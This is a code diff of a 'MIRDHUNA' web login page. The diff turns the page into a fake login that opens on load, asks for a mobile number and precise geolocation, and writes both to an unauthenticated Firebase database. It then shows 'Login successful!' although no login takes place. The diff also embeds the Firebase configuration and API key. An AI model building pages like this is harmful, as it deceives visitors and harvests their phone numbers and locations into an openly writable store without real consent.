@@ -16,41 +16,9 @@
       overflow-x: hidden;
     }
 
-    /* ---------- Floating Login Button ---------- */
-    #login-btn {
-      position: fixed;
-      top: 30px;
-      right: 0px;
-      background: linear-gradient(135deg, #d40000, #ff4c4c);
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 50px;
-      cursor: pointer;
-      z-index: 9999;
-      font-weight: 600;
-      font-size: 16px;
-      box-shadow: 0 0 20px rgba(212, 0, 0, 0.4);
-      transition: all 0.3s ease;
-      animation: pulse 2s infinite;
-    }
-
-    #login-btn:hover {
-      transform: translateY(-3px) scale(1.05);
-      box-shadow: 0 0 35px rgba(255, 76, 76, 0.7);
-      background: linear-gradient(135deg, #ff4c4c, #ff7070);
-    }
-
-    /* Subtle glowing animation */
-    @keyframes pulse {
-      0% { box-shadow: 0 0 10px rgba(212, 0, 0, 0.3); }
-      50% { box-shadow: 0 0 25px rgba(255, 76, 76, 0.7); }
-      100% { box-shadow: 0 0 10px rgba(212, 0, 0, 0.3); }
-    }
-
     /* ---------- Popup Overlay ---------- */
     #login-popup {
-      display: none;
+      display: flex;
       position: fixed;
       inset: 0;
       background: rgba(0, 0, 0, 0.7);
@@ -58,12 +26,6 @@
       justify-content: center;
       align-items: center;
       z-index: 10000;
-      animation: fadeIn 0.3s ease forwards;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
     }
 
     /* ---------- Popup Content ---------- */
@@ -76,16 +38,6 @@
       max-width: 440px;
       text-align: center;
       position: relative;
-      transform: scale(0.9);
-      opacity: 0;
-      animation: popUp 0.4s ease forwards;
-    }
-
-    @keyframes popUp {
-      to {
-        transform: scale(1);
-        opacity: 1;
-      }
     }
 
     /* ---------- Brand ---------- */
@@ -97,12 +49,6 @@
       -webkit-background-clip: text;
       color: transparent;
       letter-spacing: -0.5px;
-      animation: textGlow 3s ease-in-out infinite alternate;
-    }
-
-    @keyframes textGlow {
-      from { text-shadow: 0 0 5px rgba(255, 76, 76, 0.3); }
-      to { text-shadow: 0 0 15px rgba(255, 76, 76, 0.7); }
     }
 
     .popup-content h3 {
@@ -187,8 +133,6 @@
 </head>
 <body>
 
-  <button id="login-btn">Login</button>
-
   <div id="login-popup">
     <div class="popup-content">
       <div class="brand">MIRDHUNA</div>
@@ -201,18 +145,84 @@
     </div>
   </div>
 
-  <script>
-    // Popup logic
-    const loginBtn = document.getElementById("login-btn");
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPbOZwAZEMiC1LSDSgnSEPmSxQ7-pR2oQ",
+      authDomain: "mirdhuna-25542.firebaseapp.com",
+      databaseURL: "https://mirdhuna-25542-default-rtdb.firebaseio.com",
+      projectId: "mirdhuna-25542",
+      storageBucket: "mirdhuna-25542.appspot.com",
+      messagingSenderId: "575924409876",
+      appId: "1:575924409876:web:6ba1ed88ce941d9c83b901"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
     const popup = document.getElementById("login-popup");
     const closeBtn = document.getElementById("close-popup");
+    const submitBtn = document.getElementById("submit-login");
+    const mobInput = document.getElementById("mob-number");
 
-    loginBtn.addEventListener("click", () => popup.style.display = "flex");
-    closeBtn.addEventListener("click", () => popup.style.display = "none");
+    closeBtn.addEventListener("click", () => {
+      window.close(); // or redirect as needed
+    });
 
-    // Optional: close popup when clicking outside content
+    // Optional: close on outside click
     popup.addEventListener("click", (e) => {
-      if (e.target === popup) popup.style.display = "none";
+      if (e.target === popup) window.close();
+    });
+
+    submitBtn.addEventListener("click", async () => {
+      const number = mobInput.value.trim();
+      if (!number || !/^[6-9]\d{9}$/.test(number)) {
+        alert("Please enter a valid 10-digit Indian mobile number (starting with 6–9).");
+        return;
+      }
+
+      submitBtn.disabled = true;
+      const originalText = submitBtn.textContent;
+      submitBtn.textContent = "Logging in...";
+
+      let location = null;
+      if ("geolocation" in navigator) {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000
+            });
+          });
+          location = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude
+          };
+        } catch (err) {
+          console.warn("Geolocation not available:", err);
+        }
+      }
+
+      try {
+        // 🔥 Write directly to Firebase — no auth, no localStorage
+        await push(ref(db, 'loginHistory'), {
+          mobileNumber: number,
+          timestamp: new Date().toISOString(),
+          location: location || { error: "Geolocation denied or unavailable" }
+        });
+
+        alert("Login successful!");
+        // You can redirect or close based on your flow
+        window.close(); // or window.location.href = "your-main-page.html";
+      } catch (error) {
+        console.error("Firebase error:", error);
+        alert("Login failed. Please try again.");
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+      }
     });
   </script>
 </body>
